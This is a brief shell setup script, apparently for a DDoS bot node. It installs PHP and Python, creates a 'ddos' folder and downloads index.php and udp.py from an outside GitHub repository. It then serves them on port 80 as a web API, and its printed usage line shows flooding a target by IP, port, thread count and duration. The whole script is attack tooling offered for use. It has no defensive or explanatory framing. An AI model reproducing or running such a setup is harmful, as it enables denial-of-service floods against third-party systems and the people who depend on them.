yum update -y
yum install python3 -y
yum install python3-pip -y
yum install php -y
yum install screen -y
pip3 install requests
mkdir ddos
cd ddos
curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/index.php -o index.php
curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/udp.py -o udp.py
screen -dmS ddos php -S 0.0.0.0:80
ip_server=$(curl -s ifconfig.me)
echo "Setup Success, API: http://$ip_server/"
echo "Usage: http://$ip_server/?ip=1.1.1.1&port=80&thread=100&time=100"
